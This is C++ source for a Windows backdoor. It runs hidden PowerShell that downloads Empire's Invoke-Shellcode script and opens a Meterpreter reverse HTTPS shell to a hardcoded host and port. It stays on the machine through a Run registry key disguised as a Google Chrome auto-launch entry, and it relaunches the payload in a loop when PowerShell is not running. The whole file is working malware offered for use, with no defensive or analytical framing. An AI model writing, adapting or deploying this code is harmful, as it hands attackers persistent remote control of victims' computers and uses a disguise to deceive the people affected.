#include <iostream>
#include <cstdlib>
#include <windows.h>
#include <wininet.h>
#include <tchar.h>
#include <fstream>
#include <direct.h>
#include <ctime>
#include <sstream>
#include <cstring>
#include <winreg.h>

#pragma comment(lib, "wininet.lib")

#define NO_IP_HOST "googlechromeauto.serveirc.com"
#define LHOST "192.168.1.3"
#define LPORT 443
#define TIME_SLEEP 10

const std::string TEMP_PATH = std::getenv("TEMP");
const std::string REG_PATH = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
const std::string REG_NAME = "GoogleChromeAutoLaunch_9921366102WEAD21312ESAD31312";
const std::string REG_VALUE = "\"" + TEMP_PATH + "\\GoogleChromeAutoLaunch.exe\" --no-startup-window /prefetch:5";

void setRegKeyValue(const std::string& regPath, const std::string& name, const std::string& value) {
    HKEY hKey;
    RegOpenKey(HKEY_CURRENT_USER, regPath.c_str(), &hKey);
    RegSetValueEx(hKey, name.c_str(), 0, REG_SZ, (const BYTE*)value.c_str(), value.size());
    RegCloseKey(hKey);
}

void fire() {
    if (NO_IP_HOST) {
        // Check if no-ip is online or not
        // getNoipIpAddress();
    }

    std::string powershellCmd = "powershell -noprofile -windowstyle hidden iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost " + std::string(LHOST) + " -Lport " + std::to_string(LPORT) + " -Force;";
    
    std::system(powershellCmd.c_str());
}

void runAfterClose() {
    bool foundIT = false;
    std::string taskListOutput;
    FILE* pipe = _popen("tasklist", "r");
    if (pipe) {
        char buffer[128];
        while (!feof(pipe)) {
            if (fgets(buffer, 128, pipe) != NULL) {
                taskListOutput += buffer;
            }
        }
        _pclose(pipe);
    }
    std::stringstream taskListStream(taskListOutput);
    std::string line;
    while (std::getline(taskListStream, line)) {
        if (line.find("powershell.exe") != std::string::npos) {
            foundIT = true;
            break;
        }
    }

    if (!foundIT) {
        fire();
    }
}

void getNoipIpAddress() {
    // Implementation for getting the IP address using DNS resolving in C++
}

int main() {
    fire();
    Sleep(5000);
    setRegKeyValue(REG_PATH, REG_NAME, REG_VALUE);

    while (true) {
        runAfterClose();
        Sleep(TIME_SLEEP * 1000);
    }

    return 0;
}
